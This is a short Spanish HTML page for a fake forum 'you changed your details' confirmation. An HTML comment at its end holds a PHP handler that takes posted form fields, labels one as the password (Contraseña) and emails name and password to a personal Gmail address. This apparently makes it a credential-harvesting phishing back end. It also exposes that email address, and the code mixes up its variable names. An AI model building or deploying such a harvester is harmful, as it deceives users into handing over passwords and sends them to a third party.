<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Felicidades!</title>
</head>
<body>
    <h1>Felicidades</h1>
    <p>
        Haz cambiado tus datos!
    </p>
    <a href="ForoDeFulanoCambiado.html" id="Cambiado" target="_blank">Click aqui para volver!</a>
    <script>
  // Función para cambiar el color del enlace en bucle
  function cambiarColorEnBucle() {
    const enlace = document.getElementById('Cambiado');
    const colores = ['red', 'green', 'blue', 'orange', 'purple']; // Lista de colores
    let indice = 0; // Índice actual en la lista de colores

    setInterval(function() {
      // Cambiar el color del enlace
      enlace.style.color = colores[indice];

      // Incrementar el índice o volver al inicio si llegamos al final
      indice = (indice + 1) % colores.length;
    }, 100); // Cambiar de color cada 100 milisegundos (0.1 segundo)
  }

  // Llamar a la función al cargar la página
  window.onload = cambiarColorEnBucle;
    </script>
</body>
</html>
<!-- Formulario para que me llegen los datos
<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $Nombre = $_POST["nombre"];
    $Contraseña = $_POST["email"];

    // Configura los datos del correo electrónico
    $para = "leondamian089@gmail.com"; // Reemplaza esto con tu dirección de correo electrónico
    $asunto = "Nuevo formulario enviado desde el sitio web";

    // Construye el mensaje de correo electrónico
    $mensaje = "Nombre: " . $nombre . "\r\n";
    $mensaje .= "Contraseña: " . $Contraseña . "\r\n";

    // Envía el correo electrónico
    if (mail($para, $asunto, $mensaje)) {
        echo "Gracias por enviar el formulario. Los datos se han enviado a tu correo electrónico.";
    } else {
        echo "Hubo un problema al enviar el formulario. Por favor, inténtalo de nuevo más tarde.";
    }
}
?>
